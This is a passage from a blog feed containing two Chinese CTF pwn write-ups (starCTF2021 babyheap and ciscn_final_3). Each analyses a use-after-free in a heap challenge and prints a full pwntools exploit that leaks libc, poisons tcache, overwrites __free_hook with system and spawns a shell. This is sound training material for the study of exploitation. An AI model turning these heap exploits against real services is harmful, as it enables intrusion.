      <tag>fastbin attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>starCTF2021-babyheap</title>
    <link href="/2021/11/04/starCTF2021-babyheap/"/>
    <url>/2021/11/04/starCTF2021-babyheap/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年的<code>*CTF</code>中的一道题，赛后复现。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>采用<code>libc-2.27.so</code>（2.27-3ubuntu1.4_amd64）</li><li>file pwn</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">4</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=fb33d5a171e2edbd2bc27958e08714ca9e3a58cc, not stripped<br></code></pre></td></tr></table></figure><ul><li>checksec pwn：保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br><br></code></pre></td></tr></table></figure><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><p>该题功能齐全</p><ul><li>add： 有着16个可用的下标，且分配时会直接覆写原指针，因此我们几乎是可以分配任意个chunk，但是只允许我们分配fastbin size范围的chunk。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index&quot;</span>);<br>  idx = readInt();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;input size&quot;</span>);<br>  size = readInt();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">15</span> || size &gt; <span class="hljs-number">96</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  pools[idx] = malloc(size);<br>  result = sizes;<br>  sizes[idx] = size;<br>  return result;<br></code></pre></td></tr></table></figure><ul><li>edit：该函数根据index定位chunk_addr，然后从<code>chunk_addr+8</code>偏移开始写入内容。因此，我们无法直接进行<code>tcache poisoning</code>，可以考虑<code>chunk overlapping</code>修改fd</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input index&quot;</span>);<br>  v1 = <span class="hljs-built_in">readInt</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">15</span> || !pools[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input content&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)(pools[v1] + <span class="hljs-number">8LL</span>), (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(sizes[v1] - <span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>show：常规的打印堆块内容</li></ul><figure class="highlight plaintext"><figcaption><span>show()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs int">&#123;<br>  int v1; // [rsp+Ch] [rbp-4h]<br><br>  puts(&quot;input index&quot;);<br>  v1 = readInt();<br>  if ( v1 &lt; 0 || v1 &gt; 15 || !pools[v1] )<br>  &#123;<br>    puts(&quot;bye!&quot;);<br>    exit(0);<br>  &#125;<br>  return puts((const char *)pools[v1]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>delete：根据index释放指定chunk，但是释放后没有将指针置为0，因此存在UAF漏洞</li></ul><figure class="highlight plaintext"><figcaption><span>delete()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs void">&#123;<br>  int v0; // [rsp+Ch] [rbp-4h]<br><br>  puts(&quot;input index&quot;);<br>  v0 = readInt();<br>  if ( v0 &lt; 0 || v0 &gt; 15 || !pools[v0] )<br>  &#123;<br>    puts(&quot;bye!&quot;);<br>    exit(0);<br>  &#125;<br>  free((void *)pools[v0]);                      // UAF<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>leaveYouName：创建0x400字节（large bin）的堆块来存储name,然后输入0x100字节大小的name。</li></ul><figure class="highlight plaintext"><figcaption><span>*leaveYouName()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs char">&#123;<br>  char *result; // rax<br><br>  result = name;<br>  if ( !name )<br>  &#123;<br>    name = (char *)malloc(0x400uLL);            // 申请large bin 执行 malloc_consolidate 合并<br>    puts(&quot;your name:&quot;);<br>    result = (char *)read(0, name, 0x100uLL);<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>showYourName：使用<code>puts</code>函数打印出name</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>首先，由于保护全开，因此无法通过修改plt表或者got表来getshell，所以我们需要先获取libc基址；</li><li>由于无法申请非fastbin范围的的堆块，所以无法直接通过<code>unsorted bin</code>的方式获取libcbase。因此需要通过申请<code>large bin</code>触发执行<code>malloc_consolidate</code>函数将 fastbin 中的堆块进行合并，并放到<code>unsorted bin</code>中。所以首先申请大量相同大小的堆块，然后释放一部分，让对应tcache填满，对应的fastbin中也有堆块；</li><li>然后申请<code>large bin</code>，将fastbin中的的堆块合并（此时它们都是物理相邻的）。再通过UAF或者脏数据的形式获取<code>main_arena + offset</code>，从而获取libcbase；</li><li>之后再次申请<code>unsorted bin</code>中的空闲堆块，从而实现<code>chunk overlapping</code>（idx1与idx2指向的堆块有重叠部分），即可释放idx1，利用idx2修改idx1的fd即可实现<code>tcache poisoning</code>，从而修改<code>__free_hook</code>。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :存在UAF，但是无法写chunk的fd，因此不能造成任意写漏洞</span><br><span class="hljs-string">假如 malloc 的 size 大于 small bin 的范围，先调用 malloc_consolidate 将 fastbin 合并为 unsorted bin</span><br><span class="hljs-string">@时间        :2021/09/13 15:54:14</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./bc.so.6&#x27;</span>) <span class="hljs-comment">#libc-2.27.so</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;input size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;input content&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;your name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_name</span>():<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment"># 申请大量堆块，用于填满tcache，放到fastbin</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment"># 填满tcache,然后放在fastbin</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    delete(i)<br><br>leave_name(<span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>) <span class="hljs-comment">#触发fastbin合并，然后放到unsorted bin idx:7~15</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#从idx=7中分割0x20(chunk1)</span><br>show(<span class="hljs-number">0</span>)<br>libcbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec010</span><br>__free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-string">&#x27;libcbase:&#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br>log.info(<span class="hljs-string">&#x27;__free_hook:&#x27;</span> + <span class="hljs-built_in">hex</span>(__free_hook))<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#从idx=7中分割0x20(chunk2)</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 将idx=1放入tcache</span><br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>) + p64(__free_hook - <span class="hljs-number">0x8</span>)) <span class="hljs-comment">#堆重叠 tcache的fd不会检查size，减8是因为edit函数是从第8字节开始写 修改idx=1的fd</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#chunk2</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#类似double free, idx=2代表的是free_hook附近的内存块</span><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>edit(<span class="hljs-number">2</span>,p64(system))<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h2 id="0x4-Reference"><a href="#0x4-Reference" class="headerlink" title="0x4 Reference"></a>0x4 Reference</h2><ul><li><a href="https://blog.csdn.net/qq_37422196/article/details/112790718">https://blog.csdn.net/qq_37422196/article/details/112790718</a></li><li><a href="https://blog.csdn.net/liucc09/article/details/112784015?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">https://blog.csdn.net/liucc09/article/details/112784015?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>UAF</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>chunk overlapping</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_final_3</title>
    <link href="/2021/11/03/ciscn-final-3/"/>
    <url>/2021/11/03/ciscn-final-3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>题不难，主要是想利用这道题捋一下做题的思路</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>采用libc-2.27.so（2.27-3ubuntu1_amd64，无tcache double free 检测）</li><li>file ciscn_final_3</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ciscn_final_3</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=f8bdde8087e91d876f0b01a4767be59e42885a1e, stripped<br></code></pre></td></tr></table></figure><ul><li>checksec ciscn_final_3: 保护全开<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">   RELRO:</span>    Full RELRO<br><span class="hljs-symbol">   Stack:</span>    Canary found<br><span class="hljs-symbol">   NX:</span>       NX enabled<br><span class="hljs-symbol">   PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><p>该题就只有两个功能：add和remove</p><ul><li>add: 只能申请小于0x78大小的chunk，最多只能申请24次，并且申请成功之后会打印出申请到内存空间的地址。</li><li>remove:简单地根据指定地index确定被释放地chunk，但是指针没有被置零，存在UAF漏洞</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul><li>首先申请一个堆块获取到堆地址；</li><li>由于该题唯一地输出只有申请成功之后chunk地址，因此可以考虑申请一个在libc中的chunk，但是常规的申请是不可能的。所以我们可以考虑利用UAF修改被释放的堆块的fd为libc中的地址；</li><li>但是这个libc中地址如何得到是一个问题？当释放一个非fastbin的堆块时，会先放到unsorted bin这个双链表中，fd和bk也会被设置为<code>main_arena+offset</code>，这样我们就在已知地址的地方有libc地址，我们只需要在一个tcache bin[idx] 链表中的任意一个堆块的fd置为已知地址即可申请到libc中的堆块；</li><li>最大只能申请0x78,那如何释放一个非fastbin大小范围的chunk呢？唯一一个大于0x90的chunk就是<code>tcache struct</code>，因此可以利用<code>UAF + double free</code>控制它，，然后free即可；</li><li>得到libc基址之后，需要申请<code>__free_hook</code>附近的chunk来修改它为<code>system</code>，因此需要修改<code>tcache struct</code>。此时由于脏数据，<code>tcache struct</code>的fastbin范围的chunk的count很乱，所以不建议像上面那样控制<code>tcache struct</code>。此时，unsorted bin中指向的就是<code>tcache struct</code>，所以我们可以考虑申请一个空的<code>tcache bin</code>链表对应size的chunk，从而获取<code>tcache struct</code>的写权限。修改一个指针为<code>__free_hook</code>即可；</li><li>修改<code>__free_hook</code>之后就申请一个chunk，内容为<code>/bin/sh\x00</code>，然后释放即可getshell。</li></ul><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight plaintext"><figcaption><span>python3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs #!/usr/bin/env"># -*- encoding: utf-8 -*-<br><br>&#x27;&#x27;&#x27;<br>@文件        :exp.py<br>@说明        :UAF + tcache poisoning<br>@时间        :2021/11/03 11:17:59<br>@作者        :sh0ve1<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;,27050)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br>else:<br>    p = process(&#x27;./ciscn_final_3&#x27;)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>def add(index:int,size:int , content):<br>    p.recvuntil(b&quot;choice &gt; &quot;)<br>    p.sendline(&#x27;1&#x27;)<br>    p.recvuntil(b&quot;input the index&quot;)<br>    p.sendline(str(index))<br>    p.recvuntil(b&quot;input the size&quot;)<br>    p.sendline(str(size))<br>    p.recvuntil(b&quot;now you can write something&quot;)<br>    p.send(content)<br><br>def free(index:int):<br>    p.recvuntil(b&quot;choice &gt; &quot;)<br>    p.sendline(&#x27;2&#x27;)<br>    p.recvuntil(b&quot;input the index&quot;)<br>    p.sendline(str(index))<br><br>add(0,0x60,b&#x27;A&#x27;*0x60)<br>p.recvuntil(&#x27;0x&#x27;)<br>heapbase = int(p.recv(12),16) - 0x11e70<br>log.success(&quot;heapbase: &quot; + hex(heapbase))<br>add(1,0x10,b&#x27;GAP!&#x27;*0x4)<br><br># tcache poisoning to control tcache struct<br>free(0)<br>free(0)<br>add(2,0x60,p64(heapbase + 0x10) + b&#x27;\n&#x27;)<br>add(3,0x60,b&#x27;B&#x27;*0x60)<br># modify tcache struct to make the strcut(chunk_size=0x250) be freed to unsorted bin <br># set tcache bin[0~3]=tcache struct<br>add(4,0x60,(b&#x27;\x00&#x27;*35 + b&#x27;\x07&#x27;).ljust(0x40,b&#x27;\x00&#x27;) + p64(heapbase + 0x10)*4)<br># free tcache struct to unsorted bin, fd == bk == main_arena + 96<br>free(4)<br># tcache bin[0~3]: tcache struct --&gt; main_arena + 96<br>add(5,0x20,&#x27;C\n&#x27;) # 申请 tcache struct<br>add(6,0x20,&#x27;D\n&#x27;) # 申请 main_arena + 96 来获取 libcbase<br><br>p.recvuntil(&#x27;0x&#x27;)<br>libcbase = int(p.recv(12),16) - 0x3ebca0<br>log.success(&quot;libcbase: &quot; + hex(libcbase))<br><br># 从unsorted bin中重新获取tcache struct,并且修改tcache bin[0]的指针和计数器<br>add(7,0x60,b&#x27;\x00&#x27;*0x40 + p64(libcbase + libc.sym[&#x27;__free_hook&#x27;]) + p64(0)*3) <br>add(8,0x10,p64(libcbase + libc.sym[&#x27;system&#x27;]) + b&#x27;\n&#x27;)<br>free(5)<br><br>add(9,0x10,&#x27;/bin/sh\x00\n&#x27;)<br>free(9)<br><br># pwnlib.gdb.attach(p)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3">https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3</a></li><li><a href="https://blog.csdn.net/github_36788573/article/details/103599951">https://blog.csdn.net/github_36788573/article/details/103599951</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>UAF</tag>
      
      <tag>tcache poisoning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021RCTF-musl</title>
    <link href="/2021/10/02/2021RCTF-musl/"/>
    <url>/2021/10/02/2021RCTF-musl/</url>
    
